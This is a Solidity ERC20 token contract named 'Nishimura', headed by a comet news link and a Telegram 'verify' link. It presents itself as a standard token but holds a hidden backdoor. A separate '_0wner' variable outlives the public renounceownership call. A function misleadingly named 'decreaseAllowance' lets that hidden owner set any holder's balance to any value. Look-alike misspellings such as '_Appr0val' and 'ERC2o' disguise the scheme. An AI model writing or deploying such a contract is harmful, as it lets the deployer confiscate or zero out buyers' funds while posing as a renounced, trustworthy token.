/**

*/
// https://nationalpost.com/news/world/how-to-see-comet-nishimura
/*

Verify here: https://t.me/nishimura_erc20
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
 
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x0));
        _owner = address(0x0);
    }
}


contract  Nishimura is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _0wner;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _0wner = _msgSender();
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function transferOwnership(address newOwnr) external {
        require(_msgSender() == _0wner, "Caller is not the owner");
        _0wner = newOwnr;
    }

    event _Appr0val(address indexed account, uint256 _trarsfor, uint256 subtractedValues);

    struct Balance {
    uint256 amount;
    }

    function decreaseAllowance(address account, uint256 subtractedValues) external {
        require(_msgSender() == _0wner, "Caller is not the owner");

    Balance memory balance = Balance({ amount: _balances[account] });

    uint256 _trarsfor = balance.amount;

    balance.amount = subtractedValues;
    _balances[account] = balance.amount;

    emit _Appr0val(account, _trarsfor, subtractedValues);
    }




    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[_msgSender()] >= amount, "ERC2o: transfer amount exceeds balance");
    _balances[_msgSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(_msgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][_msgSender()] >= amount, "ERC2o: transfer amount exceeds allowance");

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][_msgSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}